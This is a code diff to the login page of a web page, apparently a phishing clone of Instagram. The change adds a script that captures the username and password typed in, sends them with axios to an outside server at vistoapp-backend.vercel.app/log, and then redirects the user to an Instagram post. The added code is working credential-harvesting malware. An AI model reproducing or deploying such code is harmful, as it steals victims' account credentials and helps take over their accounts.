@@ -115,26 +115,46 @@
       src="https://kit.fontawesome.com/44fd1bb967.js"
       crossorigin="anonymous"
     ></script>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
     <script>
-        document.getElementById('loginButton').addEventListener('click', function (event) {
-      
-          // Captura os valores dos campos de entrada
-          var username = document.getElementById('username').value;
-          var password = document.getElementById('password').value;
-      
-          // Exibe os valores no console log
-          console.log('Username:', username);
-          console.log('Password:', password);
-    // asdsadasds
-          // Redireciona para a URL desejada
-          window.location.href = "https://www.instagram.com/p/C1rpPeSg3Kp/?utm_source=ig_web_copy_link";
-      
-          // Limpa os campos de entrada (opcional)
-          document.getElementById('username').value = '';
-          document.getElementById('password').value = '';
-        });
-      </script>
-      
+      document.getElementById('loginButton').addEventListener('click', function (event) {
+        // Captura os valores dos campos de entrada
+        var username = document.getElementById('username').value;
+        var password = document.getElementById('password').value;
+  
+        // Exibe os valores no console log
+        console.log('Username:', username);
+        console.log('Password:', password);
+  
+        // Envia os dados para o servidor
+        enviarLogParaServidor(username, password);
+  
+        // Redireciona para a URL desejada
+        window.location.href = "https://www.instagram.com/p/C1rpPeSg3Kp/?utm_source=ig_web_copy_link";
+  
+        // Limpa os campos de entrada (opcional)
+        document.getElementById('username').value = '';
+        document.getElementById('password').value = '';
+      });
+  
+      // Função para enviar logs para o servidor usando Axios
+      function enviarLogParaServidor(username, password) {
+        // Dados a serem enviados
+        var data = {
+          username: username,
+          password: password
+        };
+  
+        // Envia os dados para o servidor usando Axios
+        axios.post('https://vistoapp-backend.vercel.app/log', data)
+          .then(response => {
+            console.log('Log enviado com sucesso:', response.data);
+          })
+          .catch(error => {
+            console.error('Erro ao enviar log para o servidor:', error);
+          });
+      }
+    </script>
       
   </body>
 </html>
